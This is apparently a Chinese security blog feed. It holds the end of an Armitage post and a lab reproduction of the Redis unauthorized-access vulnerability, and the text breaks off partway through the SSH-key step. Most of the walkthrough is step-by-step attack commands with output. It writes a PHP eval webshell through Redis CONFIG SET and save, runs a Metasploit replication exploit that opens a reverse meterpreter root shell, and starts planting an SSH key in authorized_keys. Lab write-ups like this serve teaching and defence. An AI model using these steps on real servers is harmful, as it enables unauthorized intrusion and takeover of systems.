msf</span><br><span class="line">        Pass: pass</span><br><span class="line"></span><br><span class="line">[*] Fingerprint (check for this string when you connect):</span><br><span class="line">        6ad0a753836d3ae33fc409bcc19c4523b1701210</span><br><span class="line">[+] hacking is such a lonely thing, until now</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>客户端连接即可</code></p><img src="/2021/07/19/Armitage/image-20210719170502446.png" class><img src="/2021/07/19/Armitage/image-20210719170541740.png" class><h2 id="0x03-Redis未授权访问利用"><a href="#0x03-Redis未授权访问利用" class="headerlink" title="0x03.Redis未授权访问利用"></a>0x03.Redis未授权访问利用</h2><blockquote><p>之前复现过Redis未授权访问漏洞，手头环境还没销毁。。。</p></blockquote><h3 id="01-搜索Redis"><a href="#01-搜索Redis" class="headerlink" title="01.搜索Redis"></a>01.搜索Redis</h3><img src="/2021/07/19/Armitage/image-20210719170906841.png" class><h3 id="02-redis-replication-cmd-exec利用"><a href="#02-redis-replication-cmd-exec利用" class="headerlink" title="02.redis_replication_cmd_exec利用"></a>02.redis_replication_cmd_exec利用</h3><p><code>双击即可进行配置</code></p><img src="/2021/07/19/Armitage/image-20210719171145861.png" class><h3 id="03-点击Launch即可利用"><a href="#03-点击Launch即可利用" class="headerlink" title="03.点击Launch即可利用"></a>03.点击Launch即可利用</h3><p><code>利用成功</code></p><img src="/2021/07/19/Armitage/image-20210719171315981.png" class><h3 id="04-shell获取"><a href="#04-shell获取" class="headerlink" title="04.shell获取"></a>04.shell获取</h3><p><code>右键</code></p><img src="/2021/07/19/Armitage/image-20210719171405205.png" class><p><code>获取root shell</code></p><img src="/2021/07/19/Armitage/image-20210719171509977.png" class>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Armitage&quot;&gt;&lt;a href=&quot;#Armitage&quot; class=&quot;headerlink&quot; title=&quot;Armitage&quot;&gt;&lt;/a&gt;Armitage&lt;/h1&gt;&lt;h2 id=&quot;0x01-什么是Armitage&quot;&gt;&lt;a href=&quot;#0x01-什么是Armitage&quot; class=&quot;headerlink&quot; title=&quot;0x01.什么是Armitage&quot;&gt;&lt;/a&gt;0x01.什么是Armitage&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Armitage 是一个用于&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy5tZXRhc3Bsb2l0LmNvbS8=&quot;&gt;Metasploit&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;的&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy5mYXN0YW5kZWFzeWhhY2tpbmcuY29tL21hbnVhbCM4&quot;&gt;可编写脚本的&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt; &lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy5mYXN0YW5kZWFzeWhhY2tpbmcuY29tL21hbnVhbCNtdWx0aQ==&quot;&gt;红队协作&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;工具，可将目标可视化、推荐漏洞利用并公开框架中的高级后漏洞利用功能。&lt;/p&gt;
&lt;p&gt;通过一个 Metasploit 实例，您的团队将：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用相同的会话&lt;/li&gt;
&lt;li&gt;共享主机、捕获的数据和下载的文件&lt;/li&gt;
&lt;li&gt;通过共享事件日志进行通信。&lt;/li&gt;
&lt;li&gt;运行机器人以自动执行红队任务。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Armitage 是&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PUctSmFIV2FMbWdjJmZlYXR1cmU9cGxheWVyX2VtYmVkZGVk&quot;&gt;红队行动&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;的&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PUctSmFIV2FMbWdjJmZlYXR1cmU9cGxheWVyX2VtYmVkZGVk&quot;&gt;力量倍增器&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cHM6Ly93d3cuY29iYWx0c3RyaWtlLmNvbS8=&quot;&gt;Cobalt Strike&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;是用于&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL2Jsb2cuY29iYWx0c3RyaWtlLmNvbS8yMDE1LzA4LzAzL3JhcGhhZWxzLW1hZ2ljLXF1YWRyYW50Lw==&quot;&gt;对手模拟&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;和&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL2Jsb2cuY29iYWx0c3RyaWtlLmNvbS8yMDE1LzA3LzA5L21vZGVscy1mb3ItcmVkLXRlYW0tb3BlcmF0aW9ucy8=&quot;&gt;红队行动&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;的工具集。截至 2015 年 10 月，Cobalt Strike 不与 Armitage 共享代码，也不依赖于 Metasploit 框架。您可以使用 Armitage 通过 Metasploit 漏洞利用来触发 Cobalt Strike 的 Beacon 有效载荷。您还可以通过 Cobalt Strike Beacon 隧道传输 Metasploit 攻击。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="kali" scheme="https://lunamoore.github.io/categories/kali/"/>
    
    <category term="Armitage" scheme="https://lunamoore.github.io/categories/kali/Armitage/"/>
    
    
    <category term="Armitage" scheme="https://lunamoore.github.io/tags/Armitage/"/>
    
    <category term="Redis" scheme="https://lunamoore.github.io/tags/Redis/"/>
    
    <category term="security tools" scheme="https://lunamoore.github.io/tags/security-tools/"/>
    
  </entry>
  
  <entry>
    <title>Redis未授权访问</title>
    <link href="https://lunamoore.github.io/2021/07/19/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <id>https://lunamoore.github.io/2021/07/19/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
    <published>2021-07-19T07:40:38.000Z</published>
    <updated>2021-07-19T08:04:24.451Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis未授权访问漏洞"><a href="#Redis未授权访问漏洞" class="headerlink" title="Redis未授权访问漏洞"></a>Redis未授权访问漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote><p>Redis默认情况下，会绑定在0.0.0.0:6379(在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错)，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等等，这样将会将Redis服务暴露在公网上，如果在没有设置密码认证(默认为空)的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。攻击者在未授权访问Redis的情况下，利用Redis自身的提供的config命令，可以进行写文件操作，攻击者还可以成功将自己的ssh公钥写入目标服务器的/root/.ssh文件的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务器登录目标服务器。</p><p>漏洞的产生条件有以下两点:</p><p>(1)  Redis绑定在0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网</p><p>(2)  没有设置密码认证（默认为空）或者弱密码，可以免密码登录redis服务</p></blockquote><a id="more"></a><h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><p>Redis 2.x，3.x，4.x，5.x</p><h2 id="三、漏洞危害"><a href="#三、漏洞危害" class="headerlink" title="三、漏洞危害"></a>三、漏洞危害</h2><p>(1) 攻击者无需认证访问到内部数据,可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据</p><p>(2) 攻击者可通过eval执行lua代码，或通过数据备份功能往磁盘写入后门文件</p><p>(3) 如果redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器 </p><h2 id="四、复现过程"><a href="#四、复现过程" class="headerlink" title="四、复现过程"></a>四、复现过程</h2><blockquote><p>环境：</p><p>kali：192.168.1.7</p><p>redis(centos7)：192.168.1.9</p></blockquote><h3 id="1-环境安装"><a href="#1-环境安装" class="headerlink" title="1.环境安装"></a>1.环境安装</h3><p><code>本次使用4.0.0</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">从官网wget到本地</span><br><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-4.0.0.tar.gz </span><br><span class="line">tar xzf redis-4.0.0.tar.gz</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">去掉ip绑定，允许除本地外的主机远程登录redis服务</span><br><span class="line">(1)bind 127.0.0.1前面加上##号注释掉 或者更改成 0.0.0.0</span><br><span class="line">(2)protected-mode设为no</span><br><span class="line"></span><br><span class="line">启动</span><br><span class="line">redis-server redis.conf</span><br></pre></td></tr></table></figure><p><code>登入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# redis-cli  -h 192.168.1.9</span><br><span class="line">192.168.1.9:6379&gt; keys *</span><br><span class="line">(empty list or set)</span><br><span class="line">192.168.1.9:6379&gt;</span><br></pre></td></tr></table></figure><p><code>攻击者常用命令</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">（1）info                       查看信息     </span><br><span class="line">（2）flushall                 删除所有缓存数据库：</span><br><span class="line">（3）flushdb                    刷新数据库</span><br><span class="line">（4）看所有键：KEYS *，使用select num可以查看键值数据。</span><br><span class="line">（5）set test &quot;who am i&quot;        设置变量</span><br><span class="line">（6）config set dir dirpath     设置路径等配置</span><br><span class="line">（7）config get dir&#x2F;dbfilename  获取路径及数据配置信息</span><br><span class="line">（8）save                       保存</span><br><span class="line">（9）get                        变量，查看变量名称</span><br></pre></td></tr></table></figure><h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><h4 id="01-写入后门文件"><a href="#01-写入后门文件" class="headerlink" title="01.写入后门文件"></a>01.写入后门文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.9:6379&gt; CONFIG SET dir /tmp</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; CONFIG SET dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; SET webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; save</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">[root@mail tmp]# ll shell.php</span><br><span class="line">-rw-r--r--. 1 root root 191 Jul 18 02:19 shell.php</span><br><span class="line">[root@mail tmp]# cat shell.php</span><br><span class="line">REDIS0008▒      redis-ver4.0.0▒</span><br><span class="line">redis-bits▒@▒ctime▒▒▒▒`used-mem�▒</span><br><span class="line">▒</span><br><span class="line">aof-preamble▒▒repl-id(2bb416a4f7439bfd8932320f435556c4747d5e64▒</span><br><span class="line">                                                               repl-offset▒▒webshell&lt;?php phpinfo();?&gt;▒hތ▒S▒+,[root@mail tmp]# xterm-256colorxterm-256color</span><br><span class="line">-bash: xterm-256colorxterm-256color: command not found</span><br><span class="line">[root@mail tmp]#</span><br></pre></td></tr></table></figure><p><code>另一种写入webshell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.9:6379&gt; CONFIG SET dir /tmp</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; SET demo &quot;\n\n\n&lt;?php eval($_POST[&#x27;pass&#x27;]);?&gt;\n\n\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; CONFIG SET dbfilename web.php</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt;</span><br><span class="line"></span><br><span class="line">[root@mail tmp]# cat web.php</span><br><span class="line">REDIS0008▒      redis-ver4.0.0▒</span><br><span class="line">redis-bits▒@▒ctime▒▒`used-mem▒؜</span><br><span class="line">▒</span><br><span class="line">aof-preamble▒▒repl-id(2bb416a4f7439bfd8932320f435556c4747d5e64▒</span><br><span class="line">                                                               repl-offset▒▒▒demo#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">                                                                                                                       ▒▒?▒▒/▒[root@mail tmp]# xterm-256colorxterm-256color</span><br><span class="line">-bash: xterm-256colorxterm-256color: command not found</span><br><span class="line">[root@mail tmp]#</span><br></pre></td></tr></table></figure><h4 id="02-MSF进行利用"><a href="#02-MSF进行利用" class="headerlink" title="02.MSF进行利用"></a>02.MSF进行利用</h4><p><code>共有5个模块可以利用</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search redis</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                                      Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                                      ---------------  ----       -----  -----------</span><br><span class="line">   0  auxiliary/gather/ibm_bigfix_sites_packages_enum           2019-03-18       normal     No     IBM BigFix Relay Server Sites and Package Enum</span><br><span class="line">   1  exploit/windows/browser/ie_createobject                   2006-04-11       excellent  No     MS06-014 Microsoft Internet Explorer COM CreateObject Code Execution</span><br><span class="line">   2  auxiliary/scanner/redis/redis_server                                       normal     No     Redis Command Execute Scanner</span><br><span class="line">   3  auxiliary/gather/redis_extractor                                           normal     Yes    Redis Extractor</span><br><span class="line">   4  auxiliary/scanner/redis/file_upload                       2015-11-11       normal     No     Redis File Upload</span><br><span class="line">   5  auxiliary/scanner/redis/redis_login                                        normal     No     Redis Login Utility</span><br><span class="line">   6  exploit/linux/redis/redis_replication_cmd_exec            2018-11-13       good       Yes    Redis Replication Code Execution</span><br><span class="line">   7  exploit/windows/browser/webex_ucf_newobject               2008-08-06       good       No     WebEx UCF atucfobj.dll ActiveX NewObject Method Buffer Overflow</span><br><span class="line">   8  exploit/windows/browser/ms07_017_ani_loadimage_chunksize  2007-03-28       great      No     Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (HTTP)</span><br><span class="line">   9  exploit/windows/email/ms07_017_ani_loadimage_chunksize    2007-03-28       great      No     Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (SMTP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 9, use 9 or use exploit/windows/email/ms07_017_ani_loadimage_chunksize</span><br></pre></td></tr></table></figure><h5 id="1-exploit-linux-redis-redis-replication-cmd-exec"><a href="#1-exploit-linux-redis-redis-replication-cmd-exec" class="headerlink" title="1.exploit/linux/redis/redis_replication_cmd_exec"></a>1.exploit/linux/redis/redis_replication_cmd_exec</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use 6</span><br><span class="line">msf6 exploit(linux/redis/redis_replication_cmd_exec) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/redis/redis_replication_cmd_exec):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   CUSTOM    true             yes       Whether compile payload file during exploiting</span><br><span class="line">   PASSWORD  foobared         no        Redis password for authentication test</span><br><span class="line">   RHOSTS    192.168.1.9      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT     6379             yes       The target port (TCP)</span><br><span class="line">   SRVHOST   192.168.1.7      yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.</span><br><span class="line">   SRVPORT   6379             yes       The local port to listen on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (linux/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.1.7      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/redis/redis_replication_cmd_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.7:4444</span><br><span class="line">[*] 192.168.1.9:6379      - Compile redis module extension file</span><br><span class="line">[+] 192.168.1.9:6379      - Payload generated successfully!</span><br><span class="line">[*] 192.168.1.9:6379      - Listening on 192.168.1.7:6379</span><br><span class="line">[*] 192.168.1.9:6379      - Rogue server close...</span><br><span class="line">[*] 192.168.1.9:6379      - Sending command to trigger payload.</span><br><span class="line">[*] Sending stage (3012548 bytes) to 192.168.1.9</span><br><span class="line">[+] 192.168.1.9:6379      - Deleted ./enfgrk.so</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.7:4444 -&gt; 192.168.1.9:58410) at 2021-07-18 02:37:24 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">/root/redis-4.0.0</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 10556 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br></pre></td></tr></table></figure><h5 id="2-auxiliary-scanner-redis-redis-server"><a href="#2-auxiliary-scanner-redis-redis-server" class="headerlink" title="2.auxiliary/scanner/redis/redis_server"></a>2.auxiliary/scanner/redis/redis_server</h5><p><code>此模块用户扫描</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/redis/redis_server) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/redis/redis_server):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   COMMAND   INFO             yes       The Redis command to run</span><br><span class="line">   PASSWORD  foobared         no        Redis password for authentication test</span><br><span class="line">   RHOSTS    192.168.1.9      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT     6379             yes       The target port (TCP)</span><br><span class="line">   THREADS   1                yes       The number of concurrent threads (max one per host)</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/redis/redis_server) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.1.9:6379      - Found redis with INFO command: $2694\x0d\x0a# Server\x0d\x0aredis_version:4.0.0\x0d\x0aredis_git_sha1:00000000\x0d\x0aredis_git_dirty:0\x0d\x0aredis_build_id:8f4dd5fce9e38cfa\x0d\x0aredis_mode:standalone\x0d\x0aos:Linux 3.10.0-1062.el7.x86_64 x86_64\x0d\x0aarch_bits:64\x0d\x0amultiplexing_api:epoll\x0d\x0aatomicvar_api:atomic-builtin\x0d\x0agcc_version:4.8.5\x0d\x0aprocess_id:10244\x0d\x0arun_id:ce9cb5cafbefebe80c08eec34aaa9072942ee567\x0d\x0atcp_port:6379\x0d\x0auptime_in_seconds:3107\x0d\x0auptime_in_days:0\x0d\x0ahz:10\x0d\x0alru_clock:15980436\x0d\x0aexecutable:/root/redis-4.0.0/redis-server\x0d\x0aconfig_file:/root/redis-4.0.0/redis.conf\x0d\x0a\x0d\x0a# Clients\x0d\x0aconnected_clients:1\x0d\x0aclient_longest_output_list:0\x0d\x0aclient_biggest_input_buf:0\x0d\x0ablocked_clients:0\x0d\x0a\x0d\x0a# Memory\x0d\x0aused_memory:828920\x0d\x0aused_memory_human:809.49K\x0d\x0aused_memory_rss:8384512\x0d\x0aused_memory_rss_human:8.00M\x0d\x0aused_memory_peak:849320\x0d\x0aused_memory_peak_human:829.41K\x0d\x0aused_memory_peak_perc:97.60%\x0d\x0aused_memory_overhead:815206\x0d\x0aused_memory_startup:765576\x0d\x0aused_memory_dataset:13714\x0d\x0aused_memory_dataset_perc:21.65%\x0d\x0atotal_system_memory:1907818496\x0d\x0atotal_system_memory_human:1.78G\x0d\x0aused_memory_lua:37888\x0d\x0aused_memory_lua_human:37.00K\x0d\x0amaxmemory:0\x0d\x0amaxmemory_human:0B\x0d\x0amaxmemory_policy:noeviction\x0d\x0amem_fragmentation_ratio:10.11\x0d\x0amem_allocator:jemalloc-4.0.3\x0d\x0aactive_defrag_running:0\x0d\x0alazyfree_pending_objects:0\x0d\x0a\x0d\x0a# Persistence\x0d\x0aloading:0\x0d\x0ardb_changes_since_last_save:0\x0d\x0ardb_bgsave_in_progress:0\x0d\x0ardb_last_save_time:1626590065\x0d\x0ardb_last_bgsave_status:ok\x0d\x0ardb_last_bgsave_time_sec:-1\x0d\x0ardb_current_bgsave_time_sec:-1\x0d\x0ardb_last_cow_size:0\x0d\x0aaof_enabled:0\x0d\x0aaof_rewrite_in_progress:0\x0d\x0aaof_rewrite_scheduled:0\x0d\x0aaof_last_rewrite_time_sec:-1\x0d\x0aaof_current_rewrite_time_sec:-1\x0d\x0aaof_last_bgrewrite_status:ok\x0d\x0aaof_last_write_status:ok\x0d\x0aaof_last_cow_size:0\x0d\x0a\x0d\x0a# Stats\x0d\x0atotal_connections_received:8\x0d\x0atotal_commands_processed:19\x0d\x0ainstantaneous_ops_per_sec:0\x0d\x0atotal_net_input_bytes:135811\x0d\x0atotal_net_output_bytes:10866\x0d\x0ainstantaneous_input_kbps:0.00\x0d\x0ainstantaneous_output_kbps:0.00\x0d\x0arejected_connections:0\x0d\x0async_full:0\x0d\x0async_partial_ok:0\x0d\x0async_partial_err:0\x0d\x0aexpired_keys:0\x0d\x0aevicted_keys:0\x0d\x0akeyspace_hits:0\x0d\x0akeyspace_misses:0\x0d\x0apubsub_channels:0\x0d\x0apubsub_patterns:0\x0d\x0alatest_fork_usec:0\x0d\x0amigrate_cached_sockets:0\x0d\x0aslave_expires_tracked_keys:0\x0d\x0aactive_defrag_hits:0\x0d\x0aactive_defrag_misses:0\x0d\x0aactive_defrag_key_hits:0\x0d\x0aactive_defrag_key_misses:0\x0d\x0a\x0d\x0a# Replication\x0d\x0arole:master\x0d\x0aconnected_slaves:0\x0d\x0amaster_replid:17593e6719397e611d460c1dabbc2367aaef7a0c\x0d\x0amaster_replid2:0d01cdc14e2ca06ce5125014632c67982313d816\x0d\x0amaster_repl_offset:0\x0d\x0asecond_repl_offset:1\x0d\x0arepl_backlog_active:0\x0d\x0arepl_backlog_size:1048576\x0d\x0arepl_backlog_first_byte_offset:0\x0d\x0arepl_backlog_histlen:0\x0d\x0a\x0d\x0a# CPU\x0d\x0aused_cpu_sys:2.68\x0d\x0aused_cpu_user:0.86\x0d\x0aused_cpu_sys_children:0.15\x0d\x0aused_cpu_user_children:0.01\x0d\x0a\x0d\x0a# Cluster\x0d\x0acluster_enabled:0\x0d\x0a\x0d\x0a# Keyspace</span><br><span class="line">[*] 192.168.1.9:6379      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(scanner/redis/redis_server) &gt;</span><br></pre></td></tr></table></figure><h5 id="3-auxiliary-gather-redis-extractor"><a href="#3-auxiliary-gather-redis-extractor" class="headerlink" title="3.auxiliary/gather/redis_extractor"></a>3.auxiliary/gather/redis_extractor</h5><p><code>获取版本</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(gather/redis_extractor) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/gather/redis_extractor):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   PASSWORD  foobared         no        Redis password for authentication test</span><br><span class="line">   RHOSTS    192.168.1.9      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT     6379             yes       The target port (TCP)</span><br><span class="line">   THREADS   1                yes       The number of concurrent threads (max one per host)</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(gather/redis_extractor) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.1.9:6379      - Connected to Redis version 4.0.0</span><br><span class="line">[*] 192.168.1.9:6379      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(gather/redis_extractor) &gt;</span><br></pre></td></tr></table></figure><h4 id="03-写入SSH公钥实现SSH登录"><a href="#03-写入SSH公钥实现SSH登录" class="headerlink" title="03.写入SSH公钥实现SSH登录"></a>03.<strong>写入SSH公钥实现SSH登录</strong></h4><blockquote><p>原理就是在数据库中插入一条数据，将本机的公钥作为value,key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生一个授权的key。</p></blockquote><p><code>kali先生成ssh公钥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 